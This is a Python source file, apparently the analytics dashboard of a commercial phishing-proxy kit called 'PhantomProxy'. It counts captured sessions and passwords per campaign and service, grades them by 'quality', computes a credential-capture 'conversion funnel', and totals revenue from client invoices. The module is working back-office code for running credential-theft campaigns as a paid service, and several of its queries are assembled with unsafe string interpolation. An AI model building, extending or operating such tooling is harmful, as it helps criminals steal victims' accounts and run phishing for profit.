#!/usr/bin/env python3
"""
PhantomProxy v12.3 PRO++ — Advanced Analytics Module
Дашборды, графики, статистика

© 2026 PhantomSec Labs. All rights reserved.
"""

import sqlite3
import json
from datetime import datetime, timedelta
from pathlib import Path
from collections import defaultdict

DB_PATH = Path(__file__).parent / 'phantom.db'

class AnalyticsDashboard:
    """Продвинутая аналитика и дашборды"""
    
    def __init__(self, db_path=DB_PATH):
        self.db_path = db_path
    
    def get_db(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def get_overview_stats(self, days=30):
        """Общая статистика за период"""
        conn = self.get_db()
        c = conn.cursor()
        
        date_filter = f'datetime("now", "-{days} days")'
        
        # Сессии
        c.execute(f'SELECT COUNT(*) FROM sessions WHERE created_at > {date_filter}')
        total_sessions = c.fetchone()[0]
        
        # Кампании
        c.execute(f'SELECT COUNT(*) FROM campaigns WHERE created_at > {date_filter}')
        total_campaigns = c.fetchone()[0]
        
        # Клиенты
        c.execute(f'SELECT COUNT(DISTINCT project_id) FROM campaigns WHERE created_at > {date_filter}')
        total_clients = c.fetchone()[0]
        
        # Средний quality score
        c.execute(f'SELECT AVG(quality_score) FROM sessions WHERE created_at > {date_filter}')
        avg_quality = c.fetchone()[0] or 0
        
        # По качеству
        c.execute(f'''SELECT classification, COUNT(*) FROM sessions 
                     WHERE created_at > {date_filter} GROUP BY classification''')
        quality_breakdown = {row[0]: row[1] for row in c.fetchall()}
        
        conn.close()
        
        return {
            'total_sessions': total_sessions,
            'total_campaigns': total_campaigns,
            'total_clients': total_clients,
            'avg_quality': round(avg_quality, 2),
            'quality_breakdown': quality_breakdown,
            'period_days': days
        }
    
    def get_daily_trend(self, days=30):
        """Тренд по дням"""
        conn = self.get_db()
        c = conn.cursor()
        
        c.execute(f'''SELECT DATE(created_at) as date, COUNT(*) as count,
                     AVG(quality_score) as avg_score
                     FROM sessions 
                     WHERE created_at > datetime("now", "-{days} days")
                     GROUP BY DATE(created_at)
                     ORDER BY date''')
        
        trends = []
        for row in c.fetchall():
            trends.append({
                'date': row['date'],
                'sessions': row['count'],
                'avg_quality': round(row['avg_score'], 2) if row['avg_score'] else 0
            })
        
        conn.close()
        return trends
    
    def get_service_breakdown(self, days=30):
        """Разбивка по сервисам"""
        conn = self.get_db()
        c = conn.cursor()
        
        c.execute(f'''SELECT service, COUNT(*) as count,
                     AVG(quality_score) as avg_quality,
                     SUM(CASE WHEN classification='EXCELLENT' THEN 1 ELSE 0 END) as excellent,
                     SUM(CASE WHEN classification='GOOD' THEN 1 ELSE 0 END) as good
                     FROM sessions 
                     WHERE created_at > datetime("now", "-{days} days")
                     GROUP BY service
                     ORDER BY count DESC''')
        
        services = []
        for row in c.fetchall():
            services.append({
                'service': row['service'],
                'count': row['count'],
                'avg_quality': round(row['avg_quality'], 2) if row['avg_quality'] else 0,
                'excellent': row['excellent'],
                'good': row['good'],
                'success_rate': round((row['excellent'] + row['good']) / max(1, row['count']) * 100, 1)
            })
        
        conn.close()
        return services
    
    def get_hourly_distribution(self):
        """Распределение по часам"""
        conn = self.get_db()
        c = conn.cursor()
        
        c.execute('''SELECT strftime('%H', created_at) as hour, COUNT(*) as count
                     FROM sessions GROUP BY hour ORDER BY hour''')
        
        hourly = {f"{int(row['hour']):02d}:00": row['count'] for row in c.fetchall()}
        conn.close()
        
        return hourly
    
    def get_top_campaigns(self, limit=10):
        """Топ кампаний"""
        conn = self.get_db()
        c = conn.cursor()
        
        c.execute('''SELECT c.id, c.name, c.service, c.status,
                     COUNT(s.id) as sessions_count,
                     AVG(s.quality_score) as avg_quality
                     FROM campaigns c
                     LEFT JOIN sessions s ON c.id = s.campaign_id
                     GROUP BY c.id
                     ORDER BY sessions_count DESC
                     LIMIT ?''', (limit,))
        
        campaigns = []
        for row in c.fetchall():
            campaigns.append({
                'id': row['id'],
                'name': row['name'],
                'service': row['service'],
                'status': row['status'],
                'sessions': row['sessions_count'],
                'avg_quality': round(row['avg_quality'], 2) if row['avg_quality'] else 0
            })
        
        conn.close()
        return campaigns
    
    def get_geographic_distribution(self):
        """Географическое распределение (по timezone)"""
        conn = self.get_db()
        c = conn.cursor()
        
        c.execute('''SELECT timezone, COUNT(*) as count
                     FROM sessions WHERE timezone IS NOT NULL
                     GROUP BY timezone ORDER BY count DESC''')
        
        geo = {row['timezone']: row['count'] for row in c.fetchall()}
        conn.close()
        
        return geo
    
    def get_conversion_funnel(self):
        """Воронка конверсии"""
        conn = self.get_db()
        c = conn.cursor()
        
        # Общее количество сессий
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        # С паролем
        c.execute("SELECT COUNT(*) FROM sessions WHERE password != '' AND password IS NOT NULL")
        with_password = c.fetchone()[0]
        
        # Excellent + Good quality
        c.execute("SELECT COUNT(*) FROM sessions WHERE classification IN ('EXCELLENT', 'GOOD')")
        high_quality = c.fetchone()[0]
        
        conn.close()
        
        return {
            'total_sessions': total,
            'with_credentials': with_password,
            'high_quality': high_quality,
            'credential_rate': round(with_password / max(1, total) * 100, 1),
            'quality_rate': round(high_quality / max(1, total) * 100, 1)
        }
    
    def get_revenue_stats(self):
        """Статистика по доходам (из invoices)"""
        conn = self.get_db()
        c = conn.cursor()
        
        try:
            c.execute('SELECT SUM(total), COUNT(*), AVG(total) FROM invoices')
            row = c.fetchone()
            
            stats = {
                'total_revenue': row[0] or 0,
                'total_invoices': row[1] or 0,
                'avg_invoice': row[2] or 0
            }
            
            # По статусам
            c.execute('SELECT status, COUNT(*), SUM(total) FROM invoices GROUP BY status')
            by_status = {r[0]: {'count': r[1], 'total': r[2] or 0} for r in c.fetchall()}
            
            stats['by_status'] = by_status
        except sqlite3.OperationalError:
            # Таблица invoices может не существовать
            stats = {
                'total_revenue': 0,
                'total_invoices': 0,
                'avg_invoice': 0,
                'by_status': {}
            }
        
        conn.close()
        return stats
    
    def generate_dashboard_json(self, days=30):
        """Генерация полного JSON дашборда"""
        return {
            'overview': self.get_overview_stats(days),
            'daily_trend': self.get_daily_trend(days),
            'service_breakdown': self.get_service_breakdown(days),
            'hourly_distribution': self.get_hourly_distribution(),
            'top_campaigns': self.get_top_campaigns(10),
            'geographic_distribution': self.get_geographic_distribution(),
            'conversion_funnel': self.get_conversion_funnel(),
            'revenue_stats': self.get_revenue_stats(),
            'generated_at': datetime.now().isoformat()
        }

# === TEST ===
if __name__ == '__main__':
    print("PhantomProxy v12.3 PRO++ — Advanced Analytics Module")
    print("="*60)
    
    analytics = AnalyticsDashboard()
    print("✅ Analytics Dashboard initialized")
    
    # Test overview
    print("\n📊 Overview Statistics (30 days):")
    overview = analytics.get_overview_stats(30)
    print(f"   Sessions: {overview['total_sessions']}")
    print(f"   Campaigns: {overview['total_campaigns']}")
    print(f"   Clients: {overview['total_clients']}")
    print(f"   Avg Quality: {overview['avg_quality']}")
    
    # Test trends
    print("\n📈 Daily Trend:")
    trends = analytics.get_daily_trend(7)
    for day in trends[-3:]:
        print(f"   {day['date']}: {day['sessions']} sessions, quality {day['avg_quality']}")
    
    # Test service breakdown
    print("\n🏢 Service Breakdown:")
    services = analytics.get_service_breakdown(30)
    for svc in services[:3]:
        print(f"   {svc['service']}: {svc['count']} sessions, {svc['success_rate']}% success")
    
    # Test funnel
    print("\n🔄 Conversion Funnel:")
    funnel = analytics.get_conversion_funnel()
    print(f"   Total Sessions: {funnel['total_sessions']}")
    print(f"   With Credentials: {funnel['with_credentials']} ({funnel['credential_rate']}%)")
    print(f"   High Quality: {funnel['high_quality']} ({funnel['quality_rate']}%)")
    
    # Generate full dashboard
    print("\n📊 Generating Full Dashboard JSON...")
    dashboard = analytics.generate_dashboard_json()
    print(f"   ✅ Generated at: {dashboard['generated_at']}")
    print(f"   Keys: {', '.join(dashboard.keys())}")
    
    print("\n✅ All analytics features ready!")
